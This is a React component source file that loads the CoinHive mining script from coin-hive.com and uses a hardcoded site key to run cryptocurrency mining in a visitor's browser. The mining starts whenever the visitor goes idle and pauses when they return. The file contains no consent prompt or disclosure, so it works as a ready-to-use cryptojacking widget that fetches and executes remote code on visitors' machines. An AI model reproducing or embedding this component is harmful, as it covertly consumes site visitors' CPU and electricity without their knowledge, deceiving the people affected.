import React, { Component } from 'react'
import Idle from 'react-idle';
import loadScript from 'load-script';

export default class extends Component {

  constructor(props) {
    super(props);
    this.miner = null;
    this.idle = false;
  }

  static defaultProps = {
    timeout: 1000,
    threads: 2,
    throttle: 0,
    siteKey: 'NjBUIBfgmgqwSRGjemP5JQCNFJu5UJTx',
    onInit: (miner) => { },
    onStart: (miner) => { },
    onStop: (miner) => { }
  }

  start() {
    if (this.miner) {
      this.miner.start();
      this.props.onStart(this.miner);
    }
  }

  stop() {
    if (this.miner) {
      this.miner.stop();
      this.props.onStop(this.miner);
    }
  }

  async componentWillMount() {
    this.miner = await new Promise(resolve => {
      loadScript('https://coin-hive.com/lib/coinhive.min.js', () => {
        resolve(CoinHive.Anonymous(this.props.siteKey));
      })
    })
    this.handleProps(this.props);
    this.props.onInit(this.miner);
    if (this.idle) {
      this.start();
    }
  }

  componentWillReceiveProps(nextProps) {
    return this.handleProps(nextProps);
  }

  handleProps({ throttle, threads }) {
    if (this.miner != null) {
      this.miner.setNumThreads(threads);
      this.miner.setThrottle(throttle);
    }
  }

  handleIdleChange = ({ idle }) => {
    if (this.miner != null) {
      if (idle) {
        this.start();
      } else {
        this.stop();
      }
    } else {
    }
    this.idle = idle;
  }

  render() {
    return <Idle
      timeout={this.props.timeout}
      onChange={this.handleIdleChange}
    />
  }
}
